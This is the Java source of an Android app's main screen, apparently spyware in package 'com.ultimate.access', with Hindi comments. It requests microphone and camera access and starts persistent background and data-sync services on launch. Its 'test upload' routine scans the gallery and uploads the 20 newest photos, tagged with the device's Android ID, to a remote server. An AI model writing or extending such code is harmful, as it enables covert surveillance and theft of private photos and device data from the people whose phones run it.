package com.ultimate.access;

import android.Manifest;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.ultimate.access.services.UltimateBackgroundService;
import com.ultimate.access.network.DataSyncService;
import com.ultimate.access.network.ApiClient;
import com.ultimate.access.network.ApiService;

import java.io.File;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 100;

    private TextView tvStatus;
    private TextView tvDeviceId;

    private Button btnServerSync;
    private Button btnExit;
    private Button btnTestUpload;

    String[] permissions = {
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tv_status);
        tvDeviceId = findViewById(R.id.tv_device_id);
        btnServerSync = findViewById(R.id.btn_server_sync);
        btnExit = findViewById(R.id.btn_exit);
        btnTestUpload = findViewById(R.id.btn_test_upload);

        checkPermissions();

        btnTestUpload.setOnClickListener(v -> {
            scanAllMedia();  // 🔥 PURA MOBILE SCAN KAREGA
        });
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            onPermissionsGranted();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            onPermissionsGranted();
        }
    }

    public void onPermissionsGranted() {
        tvStatus.setText("App Running");

        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        tvDeviceId.setText("Device ID: " + androidId);

        startBackgroundService();
        startDataSyncService();

        btnServerSync.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, ServerSyncActivity.class);
            startActivity(intent);
        });

        btnExit.setOnClickListener(v -> {
            Toast.makeText(MainActivity.this, "App Closed", Toast.LENGTH_SHORT).show();
            finishAffinity();
        });
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, UltimateBackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void startDataSyncService() {
        Intent intent = new Intent(this, DataSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    // 🔥 NEW: POORA MOBILE SCAN KAREGA
    private void scanAllMedia() {
        Log.d(TAG, "🔍 Scanning all media...");

        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
        };

        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor != null) {
                int count = 0;
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);

                while (cursor.moveToNext() && count < 20) {  // पहले 20 photos
                    String path = cursor.getString(dataColumn);
                    Log.d(TAG, "📸 Found: " + path);

                    File file = new File(path);
                    if (file.exists()) {
                        uploadToServer(file, "gallery");
                        count++;
                    }
                }

                Toast.makeText(this, "📤 Uploading " + count + " photos", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "No media found", Toast.LENGTH_LONG).show();
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Scan error: " + e.getMessage());
            Toast.makeText(this, "Scan error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void uploadToServer(File file, String type) {
        try {
            RequestBody requestFile = RequestBody.create(MediaType.parse("image/*"), file);
            MultipartBody.Part body = MultipartBody.Part.createFormData("file", file.getName(), requestFile);

            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            RequestBody deviceIdBody = RequestBody.create(MediaType.parse("text/plain"), deviceId);
            RequestBody typeBody = RequestBody.create(MediaType.parse("text/plain"), type);

            ApiService apiService = ApiClient.getClient().create(ApiService.class);
            apiService.uploadMedia(deviceIdBody, typeBody, body).enqueue(new Callback<ApiService.MediaResponse>() {
                @Override
                public void onResponse(Call<ApiService.MediaResponse> call, Response<ApiService.MediaResponse> response) {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "✅ Upload successful: " + file.getName());
                    } else {
                        Log.e(TAG, "❌ Upload failed: " + response.code() + " - " + response.message());
                    }
                }

                @Override
                public void onFailure(Call<ApiService.MediaResponse> call, Throwable t) {
                    Log.e(TAG, "❌ Upload error: " + t.getMessage());
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "❌ Exception: " + e.getMessage());
        }
    }
}